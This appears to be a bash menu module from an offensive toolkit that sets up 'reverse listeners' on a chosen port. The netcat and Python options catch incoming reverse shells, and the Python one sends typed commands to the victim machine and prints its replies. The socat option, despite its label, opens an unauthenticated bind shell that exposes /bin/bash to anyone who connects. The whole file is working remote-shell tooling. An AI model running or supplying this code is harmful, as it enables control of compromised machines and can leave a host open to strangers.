# NAME: Reverse Listener
while true; do
    clear
    echo -e "${GRAY}┌─ Reverse Listener ──────────────────┐${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[1]${NC} ${GRAY}Netcat Listener${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[2]${NC} ${GRAY}Python Listener${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[3]${NC} ${GRAY}Socat Listener${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[0]${NC} ${GRAY}Back${NC}"
    echo -e "${GRAY}└─────────────────────────────────────┘${NC}"
    read -p "  $(t choose): " c
    [ "$c" = "0" ] && return
    read -p "  Port [4444]: " p; p=${p:-4444}
    clear; echo "  Listening on $p... (Ctrl+C)"; echo ""
    case "$c" in
        1) if ! command -v nc >/dev/null; then show_install "netcat" "pkg install netcat-openbsd -y"; continue; fi
           nc -lvnp "$p" ;;
        2) python3 -c "
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', $p)); s.listen(1); print('Waiting...')
c,a=s.accept(); print('Connected:', a)
while True:
    cmd=input('$ ')
    if cmd=='exit': break
    c.send(cmd.encode()+b'\n'); print(c.recv(4096).decode(errors='ignore'))
" ;;
        3) if ! command -v socat >/dev/null; then show_install "socat" "pkg install socat -y"; continue; fi
           socat TCP-LISTEN:$p,reuseaddr,fork EXEC:/bin/bash ;;
    esac
done
